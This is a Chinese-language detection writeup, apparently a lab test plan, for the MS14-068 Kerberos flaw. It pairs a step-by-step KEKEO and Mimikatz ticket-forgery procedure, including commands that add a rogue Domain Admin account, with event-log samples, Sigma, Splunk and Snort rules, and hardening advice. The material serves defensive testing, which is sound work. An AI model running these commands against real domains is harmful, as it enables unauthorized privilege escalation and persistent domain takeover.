# T1212-Win-MS14-068-KEKEO

## 描述

攻击者可能利用Windows Kerberos协议漏洞MS14-068（CVE-2014-6324）通过票据传递攻击（Pass-the-Ticket，PtT）窃取凭据或提升权限。该漏洞允许已认证的域用户伪造Kerberos票据授予票据（TGT），将其权限提升至域管理员级别，控制域内资源。KEKEO工具可生成伪造票据，结合Mimikatz注入内存，绕过认证机制，访问域控制器或其他系统。攻击者还可伪造白银票据（Silver Ticket）针对特定服务（如SharePoint）或利用KRBTGT账户的NTLM哈希生成黄金票据（Golden Ticket），为任意账户创建TGT。此攻击无需本地管理员权限，仅需域用户凭据，影响Windows Server 2008 R2及以下版本，补丁KB3011780可修复。

## 测试案例

### 测试环境
- 域控制器：Windows Server 2008 R2（未打补丁KB3011780）
- 域内主机：Windows 7 SP1（域成员）
- 工具：KEKEO、Mimikatz
- 要求：域用户凭据（用户名、密码）、用户SID、域控制器地址、时间同步（Kerberos要求客户端与DC时间差小于5分钟）

### 测试准备
1. 确认域控制器未安装KB3011780补丁：
   ```powershell
   Get-HotFix -Id KB3011780
   ```
   - 输出为空表示未打补丁。
2. 获取域用户凭据及SID：
   ```cmd
   whoami /user
   ```
   - 示例输出：`lab\testuser S-1-5-21-1473643419-774954089-2222329127-1110`
3. 确保时间同步：
   ```cmd
   net time \\dc.lab.local /set
   ```
4. 下载KEKEO（<https://github.com/gentilkiwi/kekeo>）和Mimikatz，准备Windows 7测试环境。

### 测试步骤
1. **查询权限**：
   检查当前用户对域控制器C$共享的访问权限（预期无权限）：
   ```cmd
   dir \\dc.lab.local\C$
   ```
   - 预期输出：`Access is denied`
2. **生成伪造TGT**：
   使用KEKEO生成伪造票据：
   ```cmd
   kekeo.exe "tgs::ms14068 /user:testuser@lab.local /password:Passw0rd123 /sid:S-1-5-21-1473643419-774954089-2222329127-1110 /dc:dc.lab.local"
   ```
   - 成功生成`.kirbi`文件（如`TGT_testuser@lab.local.kirbi`）。
3. **注入票据**：
   使用Mimikatz注入伪造票据：
   ```cmd
   mimikatz.exe
   kerberos::purge
   kerberos::list
   kerberos::ptt TGT_testuser@lab.local.kirbi
   exit
   ```
4. **验证权限提升**：
   再次检查C$共享：
   ```cmd
   dir \\dc.lab.local\C$
   ```
   - 预期输出：列出C$共享内容。
   创建域管理员账户：
   ```cmd
   net user newadmin P@ssw0rd123 /add /domain
   net group "Domain Admins" newadmin /add /domain
   ```

### 参考资源
- KEKEO工具：<https://github.com/gentilkiwi/kekeo>
- 内网渗透之PTH&PTT&PTK：<https://www.bbsmax.com/A/A7zgkjRPz4/>

## 检测日志

### 数据来源
- **Windows安全日志**（域控制器）：
  - 事件ID4624：账户登录，记录Kerberos网络登录。
  - 事件ID4672：特权分配，记录异常高权限（如SeDebugPrivilege）。
  - 事件ID4768：Kerberos认证请求，记录AS-REQ。
  - 事件ID4769：Kerberos服务票据请求，记录TGS-REQ。
- **Sysmon日志**：
  - 事件ID1：进程创建，监控`kekeo.exe`或`mimikatz.exe`。
  - 事件ID3：网络连接，捕获与域控制器的Kerberos通信（端口88）。
- **网络流量**：
  - 使用WireShark捕获Kerberos流量（端口88），关注AS-REQ中`include-pac:False`或TGS-REQ中MD5校验的异常票据。
- **补丁状态**：
  - 检查KB3011780补丁安装情况。

### 日志示例
- **事件ID4624**（账户登录）：
  ```xml
  <Event>
    <EventData>
      <Data Name="TargetUserName">testuser</Data>
      <Data Name="TargetDomainName">LAB.LOCAL</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="AuthenticationPackageName">Kerberos</Data>
    </EventData>
  </Event>
  ```
- **事件ID4672**（特权分配）：
  ```xml
  <Event>
    <EventData>
      <Data Name="TargetUserName">testuser</Data>
      <Data Name="TargetDomainName">LAB.LOCAL</Data>
      <Data Name="AssignedPrivileges">SeDebugPrivilege,SeTcbPrivilege</Data>
    </EventData>
  </Event>
  ```
- **事件ID4769**（Kerberos服务票据请求）：
  ```xml
  <Event>
    <EventData>
      <Data Name="TargetUserName">testuser</Data>
      <Data Name="TargetDomainName">LAB.LOCAL</Data>
      <Data Name="ServiceName">krbtgt/LAB.LOCAL</Data>
      <Data Name="TicketOptions">0x40810010</Data>
    </EventData>
  </Event>
  ```

## 测试复现

### 环境配置
- 域控制器：Windows Server 2008 R2（未打补丁KB3011780）
- 域内主机：Windows 7 SP1
- 工具：KEKEO、Mimikatz
- 域用户：`testuser@lab.local`，密码`Passw0rd123`，SID`S-1-5-21-1473643419-774954089-2222329127-1110`
- 域控制器：`dc.lab.local`

### 复现步骤
1. **检查权限**：
   ```cmd
   whoami /user
   dir \\dc.lab.local\C$
   ```
2. **生成伪造票据**：
   ```cmd
   kekeo.exe "tgs::ms14068 /user:testuser@lab.local /password:Passw0rd123 /sid:S-1-5-21-1473643419-774954089-2222329127-1110 /dc:dc.lab.local"
   ```
   - 输出示例：
     ```
     [+] MS14-068 exploitation: Building AS-REQ for dc.lab.local... Done!
     [+] Sending AS-REQ to dc.lab.local... Done!
     [+] Receiving AS-REP from dc.lab.local... Done!
     [+] Building TGS-REQ for dc.lab.local... Done!
     [+] Sending TGS-REQ to dc.lab.local... Done!
     [+] Creating kirbi file 'TGT_testuser@lab.local.kirbi'... Done!
     ```
3. **注入票据**：
   ```cmd
   mimikatz.exe "kerberos::purge" "kerberos::list" "kerberos::ptt TGT_testuser@lab.local.kirbi" exit
   ```
4. **验证权限提升**：
   ```cmd
   dir \\dc.lab.local\C$
   net user newadmin P@ssw0rd123 /add /domain
   net group "Domain Admins" newadmin /add /domain
   ```

## 测试留痕

### Windows安全日志（域控制器）
- **事件ID4624**：
  ```xml
  <Event>
    <EventData>
      <Data Name="TargetUserName">testuser</Data>
      <Data Name="TargetDomainName">LAB.LOCAL</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="AuthenticationPackageName">Kerberos</Data>
      <Data Name="WorkstationName">WIN7-CLIENT</Data>
    </EventData>
  </Event>
  ```
- **事件ID4672**：
  ```xml
  <Event>
    <EventData>
      <Data Name="TargetUserName">testuser</Data>
      <Data Name="TargetDomainName">LAB.LOCAL</Data>
      <Data Name="AssignedPrivileges">SeDebugPrivilege,SeTcbPrivilege</Data>
    </EventData>
  </Event>
  ```
- **事件ID4769**：
  ```xml
  <Event>
    <EventData>
      <Data Name="TargetUserName">testuser</Data>
      <Data Name="TargetDomainName">LAB.LOCAL</Data>
      <Data Name="ServiceName">krbtgt/LAB.LOCAL</Data>
      <Data Name="TicketOptions">0x40810010</Data>
    </EventData>
  </Event>
  ```

### Sysmon日志
- **事件ID1**（进程创建）：
  ```xml
  <Event>
    <EventData>
      <Data Name="Image">C:\Tools\kekeo.exe</Data>
      <Data Name="CommandLine">kekeo.exe tgs::ms14068 /user:testuser@lab.local /password:Passw0rd123 /sid:S-1-5-21-1473643419-774954089-2222329127-1110 /dc:dc.lab.local</Data>
      <Data Name="User">LAB\testuser</Data>
    </EventData>
  </Event>
  ```
- **事件ID3**（网络连接）：
  ```xml
  <Event>
    <EventData>
      <Data Name="Image">C:\Tools\kekeo.exe</Data>
      <Data Name="DestinationIp">192.168.1.10</Data>
      <Data Name="DestinationPort">88</Data>
    </EventData>
  </Event>
  ```

### 网络流量（WireShark）
- AS-REQ：`include-pac:False`（正常请求包含PAC）。
- TGS-REQ：伪造PAC，使用MD5校验（非标准HMAC_MD5或AES）。

## 检测规则/思路

### 检测方法
1. **日志监控**：
   - 监控事件ID4624、4672、4768、4769，检查`TargetDomainName`或`SuppliedRealmName`是否包含异常点号（`.`）。
   - 检测事件ID4672中非管理员用户的异常高权限（如SeDebugPrivilege）。
2. **网络监控**：
   - 捕获Kerberos流量（端口88），检测AS-REQ中`include-pac:False`或TGS-REQ中MD5校验。
   - 示例Snort规则：
     ```snort
     alert udp any any -> any 88 (msg:"MS14-068 KEKEO Exploit Attempt"; content:"include-pac:False"; sid:1000002;)
     ```
3. **行为分析**：
   - 检测低权限用户访问域控制器C$共享或创建域管理员账户。
   - 监控`kekeo.exe`、`mimikatz.exe`或异常票据注入行为。
4. **补丁状态**：
   - 使用PowerShell检查补丁：
     ```powershell
     Get-HotFix -Id KB3011780
     ```

### Sigma规则
```yaml
title: MS14-068 KEKEO Kerberos Exploitation Attempt
id: 9b7c8d3e-6f7a-4b4b-ac9d-3f4a5b6c7d8e
status: stable
description: Detects potential MS14-068 exploitation attempts using KEKEO to forge Kerberos tickets
references:
  - https://attack.mitre.org/techniques/T1212/
  - https://adsecurity.org/?p=556
tags:
  - attack.privilege_escalation
  - attack.t1212
logsource:
  product: windows
  service: security
detection:
  selection_4624:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: Kerberos
    TargetDomainName|contains: '.'
  selection_4672:
    EventID: 4672
    TargetDomainName|contains: '.'
    AssignedPrivileges|contains:
      - SeDebugPrivilege
      - SeTcbPrivilege
  selection_4768:
    EventID: 4768
    SuppliedRealmName|contains: '.'
  selection_4769:
    EventID: 4769
    ServiceName|contains: 'krbtgt'
    TargetDomainName|contains: '.'
  filter_normal:
    TargetUserName|in:
      - 'ntp$'
      - 'S-1-0-0'
  timeframe: 5s
  condition: (selection_4624 and selection_4672 and (selection_4768 or selection_4769)) and not filter_normal
fields:
  - EventID
  - TargetUserName
  - TargetDomainName
  - LogonType
  - AuthenticationPackageName
  - AssignedPrivileges
  - SuppliedRealmName
  - ServiceName
falsepositives:
  - Complex domain names in legitimate Kerberos authentication
  - Administrative tools accessing domain resources
level: high
```

### Splunk规则
```spl
index=windows source="WinEventLog:Security"
(EventCode=4624 LogonType=3 AuthenticationPackageName=Kerberos TargetDomainName="*.*"
OR EventCode=4672 TargetDomainName="*.*" AssignedPrivileges IN ("*SeDebugPrivilege*","*SeTcbPrivilege*")
OR EventCode=4768 SuppliedRealmName="*.*"
OR EventCode=4769 ServiceName="*krbtgt*" TargetDomainName="*.*")
NOT TargetUserName IN ("ntp$","S-1-0-0")
| transaction TargetUserName maxspan=5s
| fields EventCode,TargetUserName,TargetDomainName,LogonType,AuthenticationPackageName,AssignedPrivileges,SuppliedRealmName,ServiceName
```

规则说明：
- 检测异常Kerberos票据请求，结合高权限分配。
- 减少误报：排除常见系统账户（如ntp$），使用5秒时间窗口。

## 防御建议
1. **补丁管理**：
   - 立即为域控制器安装KB3011780补丁，优先Windows Server 2008/2008 R2。
   - 使用PowerShell脚本定期检查补丁状态。
2. **日志配置**：
   - 启用事件ID4768/4769审计，记录成功和失败事件。
   - 部署Sysmon，监控`kekeo.exe`、`mimikatz.exe`和Kerberos网络连接。
3. **权限控制**：
   - 最小化域用户权限，限制对域控制器共享（如C$）的访问。
   - 使用组策略禁用非管理员的网络登录权限。
4. **网络防护**：
   - 部署IDS/IPS，检测`include-pac:False`或MD5校验的Kerberos流量。
   - 限制Kerberos端口（88）访问，仅允许必要设备通信。
5. **主动防御**：
   - 部署诱捕账户，监控异常高权限登录。
   - 使用EDR工具检测票据注入或异常进程行为。
6. **时间同步**：
   - 确保所有系统与域控制器时间同步，防止票据伪造。

## 参考推荐
- MITRE ATT&CK T1212:  
  <https://attack.mitre.org/techniques/T1212/>
- Active Directory Security: MS14-068 Exploit Analysis:  
  <https://adsecurity.org/?p=556>
- Microsoft Security Bulletin MS14-068:  
  <https://support.microsoft.com/kb/3011780>
- KEKEO GitHub Repository:  
  <https://github.com/gentilkiwi/kekeo>
- 内网渗透之PTH&PTT&PTK:  
  <https://www.bbsmax.com/A/A7zgkjRPz4/>
- Detecting Kerberos Ticket Forgery:  
  <https://adsecurity.org/?p=676>